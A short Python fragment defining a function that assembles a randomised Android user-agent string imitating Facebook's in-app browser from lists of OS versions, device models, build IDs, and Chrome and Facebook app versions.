def get_android_ua():
    android_versions = ["10", "11", "12", "13"]
    android_devices = [
        "SM-G998B", "SM-G991B", "SM-A736B", "Redmi Note 12", 
        "Pixel 7 Pro", "OnePlus 11", "Samsung Galaxy S23"
    ]
    android_builds = [
        "TP1A.220624.014", "SP1A.210812.016", "RP1A.200720.012"
    ]
    chrome_versions = [
        "119.0.6045.163", "118.0.5993.111", "117.0.5938.153"
    ]
    fb_versions = ["298.0.0.46.116", "297.0.0.45.115"]
    
    android = random.choice(android_versions)
    device = random.choice(android_devices)
    build = random.choice(android_builds)
    chrome = random.choice(chrome_versions)
    fb_version = random.choice(fb_versions)
    
    ua = f"Mozilla/5.0 (Linux; Android {android}; {device} Build/{build}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{fb_version};]"
    return ua

